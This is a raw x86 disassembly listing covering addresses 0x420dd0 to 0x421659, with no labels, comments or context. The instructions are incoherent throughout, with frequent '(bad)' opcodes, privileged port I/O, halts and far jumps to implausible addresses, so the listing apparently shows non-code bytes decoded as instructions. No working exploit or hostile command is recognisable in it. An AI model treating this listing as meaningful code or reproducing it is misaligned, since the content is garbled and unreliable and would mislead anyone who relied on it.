  420dd0:	mov    ah,0xe3
  420dd2:	out    dx,al
  420dd3:	sar    ah,1
  420dd5:	mov    esp,0xc3bdfcc0
  420dda:	(bad)  
  420ddb:	fild   DWORD PTR [eax]
  420ddd:	loope  0x420dbe
  420ddf:	pop    es
  420de0:	stc    
  420de1:	out    dx,eax
  420de2:	rcl    ebx,cl
  420de4:	test   eax,0xe9d0afce
  420de9:	retf   0xdafb
  420dec:	aad    0xdb
  420dee:	stc    
  420def:	sar    BYTE PTR [edx-0x2f401615],1
  420df5:	iret   
  420df6:	mov    eax,0xffe3e0d6
  420dfb:	or     edx,esi
  420dfd:	jmp    0x420e0a
  420dff:	retf   0xf8e8
  420e02:	loopne 0x420dc8
  420e04:	mov    edi,0xeeafcea9
  420e09:	jmp    0x420dfd
  420e0b:	mov    ch,0xb4
  420e0d:	(bad)  
  420e0e:	out    dx,al
  420e0f:	mov    al,0xbd
  420e11:	mov    esp,0xd3b8d0ba
  420e16:	mov    esp,0xdcbdbee1
  420e1b:	fucomip st,st(1)
  420e1d:	aad    0xcf
  420e1f:	leave  
  420e20:	in     eax,dx
  420e21:	into   
  420e22:	sti    
  420e23:	int3   
  420e24:	ror    ch,cl
  420e26:	enter  0xb0d1,0xc9
  420e2a:	jmp    0xd332c31f
  420e2f:	shr    al,cl
  420e31:	out    dx,eax
  420e32:	retf   
  420e33:	mov    ebp,0xff01f7b7
  420e38:	in     eax,dx
  420e39:	mov    ebp,0xdbf1e606
  420e3e:	in     al,0xea
  420e40:	stc    
  420e41:	int3   
  420e42:	enter  0xc0ca,0xdd
  420e46:	test   al,0xc8
  420e48:	mov    al,0xd2
  420e4a:	lods   al,BYTE PTR ds:[esi]
  420e4b:	lods   al,BYTE PTR ds:[esi]
  420e4c:	hlt    
  420e4d:	repnz mov ch,0xde
  420e50:	shr    ecx,cl
  420e52:	sti    
  420e53:	add    DWORD PTR [edx-0xc471925],edi
  420e59:	mov    ebp,0x9fddfde
  420e5e:	sti    
  420e5f:	cld    
  420e60:	out    0xc6,al
  420e62:	add    esp,ebp
  420e64:	mov    ecx,0xc1b1adf2
  420e69:	iret   
  420e6a:	jmp    0xccd6:0xf0f1d5ce
  420e71:	out    dx,al
  420e72:	sti    
  420e73:	(bad)  
  420e75:	out    dx,al
  420e76:	repnz sti 
  420e78:	add    ah,ah
  420e7a:	fld    QWORD PTR [edi]
  420e7c:	fmul   st,st(2)
  420e7e:	(bad)  
  420e7f:	fmul   QWORD PTR ds:0xd2e2f901
  420e85:	mov    bl,0xde
  420e87:	leave  
  420e88:	retf   0xcdaa
  420e8b:	int3   
  420e8c:	in     al,0xba
  420e8e:	cmc    
  420e8f:	int    0xd6
  420e91:	mov    esp,0xc3e3d7f0
  420e96:	iret   
  420e97:	repnz int 0xbc
  420e9a:	(bad)  
  420e9b:	sar    dl,cl
  420e9d:	loope  0x420e6e
  420e9f:	leave  
  420ea0:	in     eax,dx
  420ea1:	stc    
  420ea2:	call   edx
  420ea4:	mov    esp,0xb3eecec1
  420ea9:	shl    dh,cl
  420eab:	iret   
  420eac:	jmp    0xec34bf78
  420eb1:	(bad)  
  420eb3:	inc    DWORD PTR [eax]
  420eb5:	(bad)  
  420eb6:	in     eax,dx
  420eb7:	jecxz  0x420e99
  420eb9:	out    0xde,eax
  420ebb:	out    0xe1,al
  420ebd:	ret    0xd8dc
  420ec0:	dec    BYTE PTR [ecx]
  420ec2:	out    dx,al
  420ec3:	bts    DWORD PTR [esi-0x2a0f4d31],edi
  420eca:	mov    ebx,0xb5c8edda
  420ecf:	aad    0xf6
  420ed1:	mov    eax,0xf5babccb
  420ed6:	sar    DWORD PTR [eax-0x2114fb19],0xdd
  420edd:	retf   
  420ede:	(bad)  
  420ee0:	loop   0x420ebc
  420ee2:	(bad)  
  420ee3:	stc    
  420ee4:	(bad)
  420ee7:	scas   eax,DWORD PTR es:[edi]
  420ee8:	loopne 0x420ed2
  420eea:	mov    bl,0xf9
  420eec:	mov    ch,0xfb
  420eee:	ror    al,1
  420ef0:	aam    0xe4
  420ef2:	retf   
  420ef3:	aam    0xf6
  420ef5:	add    dh,bh
  420ef7:	std    
  420ef8:	loope  0x420ef5
  420efa:	in     eax,0xd9
  420efc:	(bad)  
  420efe:	fcmovnu st,st(0)
  420f00:	call   0xe64f0ce1
  420f05:	in     al,dx
  420f06:	retf   0xcae7
  420f09:	ret    
  420f0a:	cmc    
  420f0b:	into   
  420f0c:	mov    ch,0xc4
  420f0e:	(bad)  
  420f0f:	fucomi st,st(6)
  420f11:	fmul   st(0),st
  420f13:	retf   0xffb7
  420f16:	clc    
  420f17:	ret    0xc0fe
  420f1a:	hlt    
  420f1b:	cmc    
  420f1c:	out    0xda,eax
  420f1e:	add    esp,edi
  420f20:	in     eax,0xc8
  420f22:	clc    
  420f23:	(bad)  
  420f24:	(bad)  
  420f25:	int    0xaf
  420f27:	div    bl
  420f29:	in     al,dx
  420f2a:	mov    ah,0xba
  420f2c:	jmp    0x420f14
  420f2e:	retf   
  420f2f:	mov    al,0xed
  420f31:	hlt    
  420f32:	int3   
  420f33:	leave  
  420f34:	xlat   BYTE PTR ds:[ebx]
  420f35:	rcr    eax,0xf0
  420f38:	mov    esp,0xfafefec3
  420f3d:	jmp    0x420f1a
  420f3f:	fsubr  st,st(5)
  420f41:	loope  0x420f32
  420f43:	fsubr  DWORD PTR [edi-0x2d2d1816]
  420f49:	retf   
  420f4a:	call   0xf7f3d801
  420f4f:	aad    0xfb
  420f51:	repnz cmc 
  420f53:	mov    esi,0xe3bcbee1
  420f58:	cld    
  420f59:	fsubr  st(7),st
  420f5b:	jmp    0xe3:0xd60f0b
  420f62:	add    bl,dl
  420f64:	jmp    0xf7f1:0xe8c9a5c4
  420f6b:	not    bh
  420f6d:	mov    edx,0xeecdb4ba
  420f72:	dec    esi
  420f74:	jmp    0xd535f66a
  420f79:	hlt    
  420f7a:	mov    ebp,0xe3bee102
  420f7f:	stc    
  420f80:	aad    0xeb
  420f82:	or     al,0xc4
  420f84:	lods   al,BYTE PTR ds:[esi]
  420f85:	in     al,dx
  420f86:	test   eax,0xb3cfb7e6
  420f8b:	icebp  
  420f8c:	mov    ecx,0xd7ddd2c9
  420f91:	iret   
  420f92:	mov    cl,0xf1
  420f94:	add    esi,DWORD PTR [esi-0x20381f34]
  420f9a:	test   cl,0xcb
  420f9d:	std    
  420f9e:	pop    es
  420f9f:	enter  0xcda,0xe7
  420fa3:	int3   
  420fa4:	enter  0xefed,0xd6
  420fa8:	loopne 0x420f5f
  420faa:	shl    BYTE PTR [eax-0x5162408],1
  420fb0:	out    dx,al
  420fb1:	aad    0xf9
  420fb3:	icebp  
  420fb4:	fcomp  st(0)
  420fb6:	icebp  
  420fb7:	rol    DWORD PTR [eax],cl
  420fb9:	rol    ch,cl
  420fbb:	mov    esp,0x60a07dd
  420fc0:	jmp    0xf042f1d4
  420fc5:	shr    ch,cl
  420fc7:	jecxz  0x420f99
  420fc9:	in     eax,0xe6
  420fcb:	in     al,dx
  420fcc:	mov    bh,0xd6
  420fce:	mov    ah,0xde
  420fd0:	cli    
  420fd1:	in     al,dx
  420fd2:	xlat   BYTE PTR ds:[ebx]
  420fd3:	push   DWORD PTR [edi-0x4130e41]
  420fd9:	aad    0xb9
  420fdb:	cld    
  420fdc:	inc    esi
  420fde:	add    ebx,ebx
  420fe0:	les    eax,FWORD PTR [esi+ebx*8]
  420fe3:	(bad)  
  420fe5:	(bad)
  420fe9:	enter  0xe7b5,0xf4
  420fed:	bnd jmp 0xbbfbd4d8
  420ff3:	repz clc 
  420ff5:	iret   
  420ff6:	shr    esp,cl
  420ff8:	hlt    
  420ff9:	std    
  420ffa:	ret    
  420ffb:	loope  0x420fd3
  420ffd:	mov    DWORD PTR [ecx],0xffe1cffc
  421003:	call   0xf3f9bae7
  421008:	aam    0xe1
  42100a:	jmp    0xeb3bf7f6
  42100f:	out    dx,al
  421010:	std    
  421011:	mov    dl,0xd6
  421013:	sar    al,1
  421015:	repz ret 0xf7f3
  421019:	in     al,dx
  42101a:	hlt    
  42101b:	clc    
  42101c:	call   0xe431d5f8
  421021:	dec    DWORD PTR ds:0xaee6ab0c
  421027:	(bad)  
  421028:	ror    dl,cl
  42102a:	in     eax,dx
  42102b:	out    0xb0,eax
  42102d:	mov    ah,0xd2
  42102f:	sti    
  421030:	aad    0xec
  421032:	cli    
  421033:	fucomp st(6)
  421035:	add    bl,bh
  421037:	pop    es
  421038:	add    eax,0xf6c502f4
  42103d:	lock loopne 0x42102e
  421040:	push   cs
  421041:	fcmovb st,st(1)
  421043:	add    esi,eax
  421045:	test   al,0xcc
  421047:	mov    dh,0xd0
  421049:	mov    cl,0xfb
  42104b:	les    edi,FWORD PTR [ecx-0x6063a4c]
  421051:	(bad)  
  421052:	mov    ecx,0x7efe2be
  421057:	rol    BYTE PTR ds:0xe3cac0c1,0xc8
  42105e:	cld    
  42105f:	test   al,0xff
  421062:	(bad)  
  421064:	test   al,0xb3
  421066:	out    dx,al
  421067:	test   al,0xee
  421069:	(bad)  
  42106a:	mul    ecx
  42106c:	cli    
  42106d:	retf   
  42106e:	mov    ebx,0xd2b6dad2
  421073:	aad    0xcf
  421075:	int3   
  421076:	mov    ebp,0xfedbdff1
  42107b:	rcr    ah,cl
  42107d:	clc    
  42107e:	or     edi,esp
  421080:	in     al,dx
  421081:	leave  
  421082:	repnz add bh,BYTE PTR [ebp+edi*4-0x51123716]
  42108a:	int3   
  42108b:	repnz idiv BYTE PTR [ebx-0x12240b10]
  421092:	xlat   BYTE PTR ds:[ebx]
  421093:	mov    esp,0xb4efbcc9
  421098:	jecxz  0x421090
  42109a:	(bad)  
  42109b:	std    
  42109c:	in     al,0x5
  42109e:	fnstcw WORD PTR [eax+ecx*1-0x1019f6fc]
  4210a5:	(bad)  
  4210a7:	leave  
  4210a8:	int3   
  4210a9:	out    0xca,eax
  4210ab:	in     eax,dx
  4210ac:	rcl    esi,cl
  4210ae:	jmp    0xccba:0xf2efffda
  4210b5:	fsubrp st(2),st
  4210b7:	mov    edi,0xe6def2d0
  4210bc:	fild   WORD PTR [ebx+ebp*8]
  4210bf:	pop    es
  4210c0:	clc    
  4210c1:	or     ch,ch
  4210c3:	add    edx,ecx
  4210c5:	mov    eax,0xe9c9ddc6
  4210ca:	leave  
  4210cb:	mov    ch,0xfb
  4210cd:	mov    dh,0xc8
  4210cf:	(bad)
  4210d2:	aam    0xd3
  4210d4:	repnz sar bl,1
  4210d7:	shl    ecx,1
  4210d9:	aad    0xbd
  4210db:	fdivrp st(1),st
  4210dd:	out    0xe9,eax
  4210df:	fisttp DWORD PTR [ecx]
  4210e1:	add    cl,bl
  4210e3:	push   DWORD PTR [ecx-0x1843560f]
  4210e9:	loop   0x4210b8
  4210eb:	mov    ebx,0xfab1d3e0
  4210f0:	fcmovne st,st(7)
  4210f2:	retf   
  4210f3:	fild   DWORD PTR [edx]
  4210f5:	out    dx,al
  4210f6:	cli    
  4210f7:	in     eax,0xd4
  4210f9:	xlat   BYTE PTR ds:[ebx]
  4210fa:	fadd   st(1),st
  4210fc:	(bad)  
  4210fd:	xlat   BYTE PTR ds:[ebx]
  4210fe:	hlt    
  4210ff:	cli    
  421100:	(bad)  
  421101:	in     al,0xf2
  421103:	or     dl,al
  421105:	out    dx,al
  421106:	in     al,dx
  421107:	enter  0xcdb3,0xf0
  42110b:	mov    bl,0xe9
  42110d:	fnsetpm(287 only) 
  42110f:	aam    0xba
  421111:	mov    ecx,0x7f4eeff
  421116:	(bad)  
  421118:	fucom  st(4)
  42111a:	ret    
  42111b:	lds    eax,FWORD PTR [eax]
  42111d:	fcmovnbe st,st(4)
  42111f:	in     eax,0x9
  421121:	jmp    0x4210f2
  421123:	loopne 0x4210f4
  421125:	out    dx,al
  421126:	xlat   BYTE PTR ds:[ebx]
  421127:	test   al,0xc1
  421129:	mov    ch,0xf4
  42112b:	rol    esi,0xf0
  42112e:	mov    dh,0xfb
  421130:	(bad)  
  421131:	aad    0xd8
  421133:	jmp    0xdcbb:0xfef8f2f1
  42113a:	add    al,0xc7
  42113c:	cli    
  42113d:	out    0xe3,eax
  42113f:	(bad)  
  421140:	(bad)  
  421142:	retf   0xc2c8
  421145:	mov    eax,0xf4b6d5ce
  42114a:	into   
  42114b:	(bad)
  42114e:	int    0xee
  421150:	int3   
  421151:	leave  
  421152:	stc    
  421153:	fxtract 
  421155:	(bad)  
  421157:	fdivr  st(6),st
  421159:	lds    eax,FWORD PTR [esp+ebx*8]
  42115c:	mov    dh,0x1
  42115f:	jecxz  0x42115c
  421161:	in     eax,0xc4
  421163:	retf   
  421164:	in     eax,0xe3
  421166:	out    0xcc,al
  421168:	retf   0xe1b4
  42116b:	mov    dl,0xb1
  42116d:	int    0xc6
  42116f:	shr    esp,1
  421171:	shl    bl,cl
  421173:	aam    0xc9
  421175:	iret   
  421176:	mov    ebp,0xfefcffbf
  42117b:	fdivr  st,st(2)
  42117d:	retf   
  42117e:	aam    0xe9
  421180:	out    dx,eax
  421181:	loope  0x421167
  421183:	or     ebp,eax
  421185:	retf   0xcfc1
  421188:	iret   
  421189:	mov    bh,0xc2
  42118b:	mov    ebx,0xb0bac7cc
  421190:	repnz (bad) 
  421192:	(bad)  
  421194:	fidivr WORD PTR [eax+0x4bee0b9]
  42119a:	ror    BYTE PTR [edx],1
  42119c:	(bad)  
  42119d:	or     ebx,edx
  42119f:	cld    
  4211a0:	in     al,dx
  4211a1:	into   
  4211a2:	stc    
  4211a3:	repz ror ah,cl
  4211a6:	test   al,0xf0
  4211a9:	lods   al,BYTE PTR ds:[esi]
  4211aa:	lods   eax,DWORD PTR ds:[esi]
  4211ab:	mov    ah,0xf5
  4211ad:	enter  0xc4d8,0xdd
  4211b1:	clc    
  4211b2:	aam    0xb4
  4211b4:	mov    ebx,0xbf05d9d1
  4211b9:	push   es
  4211ba:	aam    0xfc
  4211bc:	fild   DWORD PTR [ecx]
  4211be:	(bad)  
  4211bf:	(bad)  
  4211c0:	jmp    0xa9310ed8
  4211c5:	shr    eax,1
  4211c7:	retf   0xb0d4
  4211ca:	sar    cl,cl
  4211cc:	shl    ah,1
  4211ce:	mov    ebx,0xfaf1d6b0
  4211d3:	call   ebp
  4211d5:	xlat   BYTE PTR ds:[ebx]
  4211d6:	aam    0xe1
  4211d8:	cld    
  4211d9:	cld    
  4211da:	in     eax,0xe3
  4211dc:	call   0xf911f2d6
  4211e1:	retf   0xcb0f
  4211e4:	shl    edx,1
  4211e6:	shl    al,cl
  4211e8:	mov    bl,0xad
  4211ea:	not    ecx
  4211ec:	(bad)  
  4211ee:	lds    esi,FWORD PTR [ebp-0xe0c2002]
  4211f4:	lock add dh,cl
  4211f7:	lock fsubp st(4),st
  4211fa:	retf   
  4211fb:	push   es
  4211fc:	clc    
  4211fd:	std    
  4211fe:	mov    ebp,0xf9ee06ce
  421203:	(bad)  
  421205:	ret    
  421206:	iret   
  421207:	out    0xd6,eax
  421209:	loop   0x4211d4
  42120b:	ret    0xd0f3
  42120e:	lods   eax,DWORD PTR ds:[esi]
  42120f:	int3   
  421210:	mov    ebx,0xedcfd2f2
  421215:	fxch   st(5)
  421217:	add    edx,esp
  421219:	(bad)  
  42121a:	aam    0xc2
  42121c:	jmp    0x421227
  42121e:	mov    ebp,0xde0700da
  421223:	retf   
  421224:	les    edi,FWORD PTR [eax-0xb0f0a34]
  42122a:	mov    bl,0xf4
  42122c:	imul   BYTE PTR [esi-0x2d2d3b29]
  421232:	inc    bl
  421234:	fdivp  st(7),st
  421236:	loopne 0x421210
  421238:	in     eax,0xbd
  42123a:	loopne 0x421240
  42123c:	stc    
  42123d:	or     ch,bl
  42123f:	push   cs
  421240:	mov    BYTE PTR [esi+eax*1],0xd9
  421244:	(bad)  
  421245:	mov    ebp,0xc1c7ddc3
  42124a:	lock in eax,dx
  42124c:	out    dx,al
  42124d:	aad    0xe5
  42124f:	sti    
  421250:	mov    ecx,0xfedbc8d6
  421255:	test   BYTE PTR [ebx],0xed
  421258:	add    edi,edi
  42125a:	rol    BYTE PTR [esi+ebx*8],0x1
  42125e:	out    dx,eax
  42125f:	rcr    bh,0xe
  421262:	fst    DWORD PTR [ebx]
  421264:	mov    edi,0xd7eee3c5
  421269:	jmp    0xfeb7:0xb2e5b0d6
  421270:	fcmovu st,st(5)
  421272:	iret   
  421273:	icebp  
  421274:	shl    ebp,cl
  421276:	icebp  
  421277:	fadd   st(5),st
  421279:	shl    ecx,cl
  42127b:	jecxz  0x421258
  42127d:	mov    edi,0xefebd9db
  421283:	(bad)  
  421285:	jmp    0xb513c55d
  42128a:	int3   
  42128b:	fidiv  DWORD PTR [eax-0x300f3547]
  421291:	out    dx,eax
  421292:	mov    esp,0xeed3eddf
  421297:	in     eax,0xd9
  421299:	(bad)  
  42129a:	add    eax,DWORD PTR [ebx]
  42129c:	loope  0x421288
  42129e:	or     ecx,eax
  4212a0:	loope  0x421270
  4212a2:	jecxz  0x421283
  4212a4:	int3   
  4212a5:	lods   eax,DWORD PTR ds:[esi]
  4212a6:	ret    0xc7cc
  4212a9:	fmul   st(5),st
  4212ab:	repnz int3 
  4212ad:	fstp   TBYTE PTR [ebx-0x47122c23]
  4212b3:	int3   
  4212b4:	ret    
  4212b5:	loopne 0x42129a
  4212b7:	pop    es
  4212b8:	cmc    
  4212b9:	clc    
  4212ba:	loope  0x4212a3
  4212bc:	or     BYTE PTR [esi+0xd05f904],bh
  4212c2:	fimul  WORD PTR ds:0xc4ebe4b3
  4212c8:	mov    bh,0xd6
  4212ca:	in     al,0xe0
  4212cc:	call   0x11dfb1
  4212d1:	(bad)  
  4212d2:	jmp    0xcdd2:0x1edf1bf
  4212d9:	jmp    0x42129b
  4212db:	shl    edi,1
  4212dd:	fcmovne st,st(3)
  4212df:	fadd   st,st(7)
  4212e1:	out    0x1,eax
  4212e3:	add    eax,0xebcce9eb
  4212e8:	shr    BYTE PTR [eax+eiz*8-0x14492b17],0xf0
  4212f0:	aad    0xb9
  4212f2:	mov    ch,0xbf
  4212f4:	jmp    0xc72a06b3
  4212f9:	out    0xc4,al
  4212fb:	repnz stc 
  4212fd:	std    
  4212fe:	lds    edi,FWORD PTR [esp+edx*8-0x3a340105]
  421305:	icebp  
  421306:	mov    dl,0xce
  421308:	lods   eax,DWORD PTR ds:[esi]
  421309:	lds    ebp,FWORD PTR [ebp-0x39094846]
  42130f:	iret   
  421310:	xlat   BYTE PTR ds:[ebx]
  421311:	in     eax,dx
  421312:	clc    
  421313:	std    
  421314:	std    
  421315:	pop    es
  421316:	hlt    
  421317:	push   es
  421318:	repz out 0xe1,eax
  42131b:	icebp  
  42131c:	(bad)  
  42131e:	add    al,0xed
  421320:	clc    
  421321:	fisttp WORD PTR [eax]
  421323:	into   
  421324:	retf   0xdfbc
  421327:	lds    ebp,FWORD PTR [ebx-0x493a3035]
  42132d:	fistp  QWORD PTR [ebx-0x43290538]
  421333:	shr    dh,cl
  421335:	shl    bh,0xc6
  421338:	add    al,0xf4
  42133a:	cli    
  42133b:	fld    DWORD PTR [eax+edi*8]
  42133e:	or     ecx,DWORD PTR [edx]
  421340:	jmp    esp
  421342:	in     al,dx
  421343:	repz test eax,0xf7f7d3e1
  421349:	retf   0xf3fa
  42134c:	rcl    cl,0xca
  42134f:	mov    ebx,0xe2bbddec
  421354:	rcr    ebx,cl
  421356:	fmul   st,st(4)
  421358:	stc    
  421359:	mov    ebp,0x9d1f5d7
  42135e:	retf   
  42135f:	(bad)  
  421360:	push   esp
  421362:	fcmovnbe st,st(3)
  421364:	fdivr  QWORD PTR [ebp-0x2f3b493e]
  42136a:	iret   
  42136b:	out    dx,eax
  42136c:	retf   0xe9fa
  42136f:	sar    BYTE PTR [esi-0xd13222d],1
  421375:	mov    dh,0xd3
  421377:	cli    
  421378:	mov    esi,0xe4fbd4cc
  42137d:	std    
  42137e:	call   0xe93a1c6d
  421383:	out    0xbe,al
  421385:	mul    esi
  421387:	ret    
  421388:	enter  0xd4c7,0xba
  42138c:	aad    0xce
  42138e:	cmc    
  42138f:	(bad)  
  421390:	jmp    0xdc180d59
  421395:	mov    esi,0xf1dcfdbe
  42139a:	(bad)  
  42139b:	(bad)  
  42139c:	(bad)  
  42139e:	retf   
  42139f:	(bad)  
  4213a0:	into   
  4213a1:	loop   0x4213b0
  4213a3:	rcr    ebp,cl
  4213a5:	test   eax,0xf2c7ecc8
  4213ab:	mov    dl,0xf8
  4213ad:	int    0xc4
  4213af:	stc    
  4213b0:	ror    cl,cl
  4213b2:	aad    0xc8
  4213b4:	sar    DWORD PTR [esi+ebx*8+0x6d501f3],1
  4213bb:	rcr    bh,1
  4213bd:	(bad)  
  4213bf:	rcl    ah,0x0
  4213c2:	(bad)  
  4213c3:	repnz shr edx,1
  4213c6:	in     eax,0xe4
  4213c8:	int    0xd2
  4213ca:	int3   
  4213cb:	xlat   BYTE PTR ds:[ebx]
  4213cc:	fcomp  st(1)
  4213ce:	aad    0xc5
  4213d0:	mov    ebx,0xc8f6d3ba
  4213d5:	in     al,dx
  4213d6:	add    edi,edi
  4213d8:	shl    dh,0xa
  4213db:	neg    ebx
  4213dd:	hlt    
  4213de:	fld    DWORD PTR [ecx]
  4213e0:	hlt    
  4213e1:	add    al,0xcd
  4213e3:	out    dx,al
  4213e4:	lods   al,BYTE PTR ds:[esi]
  4213e5:	icebp  
  4213e6:	shl    DWORD PTR [edx-0x3f0f3233],cl
  4213ec:	iret   
  4213ed:	fcmovbe st,st(7)
  4213ef:	repz icebp 
  4213f1:	(bad)  
  4213f2:	sar    ecx,1
  4213f4:	div    ch
  4213f6:	cmc    
  4213f7:	loope  0x4213da
  4213f9:	in     eax,0xd0
  4213fb:	shl    edi,0x6
  4213fe:	hlt    
  4213ff:	enter  0xe8ca,0xe5
  421403:	fild   QWORD PTR [edi+eax*8-0x2f0e321c]
  42140a:	mov    ebx,0xb4d8eece
  42140f:	in     al,0xcd
  421411:	into   
  421412:	test   BYTE PTR [edx],0x0
  421415:	iret   
  421416:	fstp   TBYTE PTR [edi-0xb0645fe]
  42141c:	retf   
  42141d:	jecxz  0x421403
  42141f:	loopne 0x42141a
  421421:	retf   
  421422:	into   
  421423:	or     al,0xc4
  421425:	scas   eax,DWORD PTR es:[edi]
  421426:	out    dx,al
  421427:	lock mov bh,0xd7
  42142a:	ret    
  42142b:	mov    dh,0xdb
  42142d:	loopne 0x421422
  42142f:	clc    
  421430:	mov    bl,0xbf
  421432:	(bad)  
  421433:	cld    
  421434:	shl    ah,1
  421436:	fucomp st(5)
  421438:	ret    
  421439:	lock fucomip st,st(2)
  42143c:	or     esp,ecx
  42143e:	test   DWORD PTR [edi],0xeec806c6
  421444:	lods   al,BYTE PTR ds:[esi]
  421445:	lods   eax,DWORD PTR ds:[esi]
  421446:	out    0xd0,al
  421448:	xlat   BYTE PTR ds:[ebx]
  421449:	mov    bh,0xcd
  42144b:	(bad)  
  42144c:	icebp  
  42144d:	enter  0xbec9,0xe4
  421451:	retf   
  421452:	test   bl,0xd7
  421455:	mov    dh,0xdd
  421457:	out    dx,al
  421458:	aad    0xd1
  42145a:	(bad)  
  42145b:	sar    bh,0xf
  42145e:	(bad)  
  421460:	sti    
  421461:	loope  0x42143e
  421463:	loope  0x42142b
  421465:	mov    esi,0xecacf3b0
  42146a:	shl    ah,1
  42146c:	fdiv   DWORD PTR [ebp-0x3249120a]
  421472:	cli    
  421473:	push   DWORD PTR [edi-0x3f43102c]
  421479:	rcl    ah,0xc0
  42147c:	(bad)  
  42147d:	rcr    ch,1
  42147f:	in     eax,0xdc
  421481:	add    bh,cl
  421483:	in     eax,0xee
  421485:	fdiv   st,st(3)
  421487:	int    0xf1
  421489:	mov    esp,0xffc4d0d5
  42148e:	mov    eax,0xdcfed2d4
  421493:	add    bh,dh
  421495:	pop    es
  421496:	int3   
  421497:	int3   
  421498:	lds    eax,FWORD PTR [ebx+esi*8]
  42149b:	sti    
  42149c:	cmc    
  42149d:	out    0xc5,al
  42149f:	out    dx,eax
  4214a0:	jmp    0xe4c4:0xbddce80b
  4214a7:	div    dh
  4214a9:	stos   BYTE PTR es:[edi],al
  4214aa:	retf   0xb2ed
  4214ad:	jmp    0x3fae5a0
  4214b2:	mov    ebp,0xc7eed8d6
  4214b7:	fsubr  st(6),st
  4214b9:	in     al,dx
  4214ba:	add    esp,edx
  4214bc:	leave  
  4214bd:	or     bh,ah
  4214bf:	or     ebx,ebp
  4214c1:	jmp    0xeede:0xf2b2000e
  4214c8:	(bad)  
  4214ca:	(bad)
  4214ce:	in     eax,0xf1
  4214d0:	mov    bh,0x3
  4214d2:	clc    
  4214d3:	rol    ecx,cl
  4214d5:	rcl    ecx,cl
  4214d7:	in     al,dx
  4214d8:	rol    BYTE PTR [ecx],cl
  4214da:	sar    DWORD PTR [ebx+ebp*8+0x3f6f6eb],0xcf
  4214e2:	out    0x9,eax
  4214e4:	scas   al,BYTE PTR es:[edi]
  4214e5:	shl    bl,0xcb
  4214e8:	shl    bl,1
  4214ea:	cli    
  4214eb:	(bad)  [ecx-0xd323938]
  4214f1:	aad    0xd3
  4214f3:	cmc    
  4214f4:	std    
  4214f5:	ret    0xd7b9
  4214f8:	ret    
  4214f9:	rcr    dl,0xeb
  4214fc:	jmp    0xf8ea:0xfac8f6d7
  421503:	jmp    0xbdfecdfb
  421508:	hlt    
  421509:	in     al,0xe6
  42150b:	mov    edx,0xb9baf7da
  421510:	cli    
  421511:	(bad)  
  421512:	into   
  421513:	sti    
  421514:	(bad)  
  421515:	xlat   BYTE PTR ds:[ebx]
  421516:	shl    bl,cl
  421518:	stc    
  421519:	loop   0x4214fb
  42151b:	mov    edx,0xeedccbc8
  421521:	faddp  st(4),st
  421523:	loope  0x4214cd
  421525:	repnz scas eax,DWORD PTR es:[edi]
  421527:	(bad)  
  421528:	mov    cl,0xe5
  42152a:	lods   al,BYTE PTR ds:[esi]
  42152b:	fcmovb st,st(1)
  42152d:	mov    al,0xd9
  42152f:	repz mov ecx,0xbd03e4
  421535:	mov    esi,0xbae1d1e7
  42153a:	lock icebp 
  42153c:	push   es
  42153d:	cli    
  42153e:	add    ecx,edx
  421540:	sti    
  421541:	into   
  421542:	int3   
  421543:	int3   
  421544:	sar    BYTE PTR [eax-0x491e523c],0xf2
  42154b:	hlt    
  42154c:	ror    eax,1
  42154e:	mov    edx,0x2fbfdb9
  421553:	jecxz  0x42150f
  421555:	jecxz  0x42153a
  421557:	jecxz  0x42152c
  421559:	mov    edx,0xdbd70bdd
  42155e:	out    0xdb,eax
  421560:	or     dh,bl
  421562:	jmp    0xe224be4f
  421567:	test   al,0xf1
  421569:	shl    cl,cl
  42156b:	aad    0xf7
  42156d:	cmc    
  42156e:	imul   ecx
  421570:	(bad)  
  421572:	mov    esp,0xf8fdd5f3
  421577:	pop    es
  421578:	std    
  421579:	ret    0xb8b9
  42157c:	push   es
  42157d:	std    
  42157e:	inc    BYTE PTR ds:0xc4e50dee
  421584:	lods   al,BYTE PTR ds:[esi]
  421585:	shl    BYTE PTR [edx-0x2e15090f],cl
  42158b:	aad    0xeb
  42158d:	out    dx,al
  42158e:	leave  
  42158f:	mov    edx,0xf4fdf6ff
  421594:	leave  
  421595:	mov    edi,0xc5dfcdf6
  42159a:	out    0xc3,al
  42159c:	or     al,cl
  42159e:	jmp    0x42159d
  4215a0:	out    dx,eax
  4215a1:	in     al,dx
  4215a2:	repnz add al,ah
  4215a5:	mov    bl,0xdf
  4215a7:	lods   eax,DWORD PTR ds:[esi]
  4215a8:	jmp    0x421557
  4215aa:	into   
  4215ab:	cli    
  4215ac:	stc    
  4215ad:	sti    
  4215ae:	vpor   xmm6,xmm2,xmm3
  4215b2:	add    eax,ebx
  4215b4:	idiv   DWORD PTR [edx-0x3d201e43]
  4215ba:	repnz loop 0x4215bc
  4215bd:	aad    0xd7
  4215bf:	push   cs
  4215c0:	loop   0x42158c
  4215c2:	loope  0x4215ae
  4215c4:	(bad)  
  4215c5:	mov    eax,0xb0d6c7ca
  4215ca:	out    0xda,eax
  4215cc:	shl    ch,1
  4215ce:	(bad)  
  4215cf:	std    
  4215d0:	std    
  4215d1:	mov    esp,0xcdc9cae8
  4215d6:	fidivr DWORD PTR [eax-0x250c0529]
  4215dc:	(bad)  
  4215de:	call   0xe0501aea
  4215e3:	enter  0xe4e3,0xcf
  4215e7:	call   0xef2e02c2
  4215ec:	loopne 0x4215dc
  4215ee:	(bad)  
  4215ef:	shl    bl,1
  4215f1:	mov    edi,0xf4bad1b1
  4215f6:	cld    
  4215f7:	aad    0xd4
  4215f9:	add    al,0xea
  4215fb:	ret    
  4215fc:	fsubr  st,st(3)
  4215fe:	jmp    0xfd04f402
  421603:	cli    
  421604:	mov    ebp,0xb2b3c8b8
  421609:	(bad)  
  42160a:	jmp    0xbde4:0xf9b0c4e6
  421611:	mov    ebx,0xf4dfd8fd
  421616:	ret    
  421617:	loopne 0x4215da
  421619:	mov    ebp,0xd0d4c7eb
  42161e:	std    
  42161f:	aam    0xce
  421621:	add    al,BYTE PTR ds:0xbdb2e2e9
  421627:	test   al,0xbc
  421629:	mov    dl,0xce
  42162c:	jmp    0xd53bee07
  421631:	aad    0xc8
  421633:	mov    edx,0xded3efd6
  421638:	fst    st(7)
  42163a:	(bad)  
  42163b:	(bad)  
  42163c:	(bad)  
  42163d:	push   es
  42163e:	fucom  st(7)
  421640:	retf   
  421641:	fild   WORD PTR [edx]
  421643:	dec    dh
  421645:	rol    edi,0xa8
  421648:	lock repnz mov ch,0xf5
  42164c:	rcl    cl,0xba
  42164f:	(bad)  
  421651:	leave  
  421652:	mov    edi,0xd7bfb8df
  421657:	shl    al,cl
  421659:	(bad)  
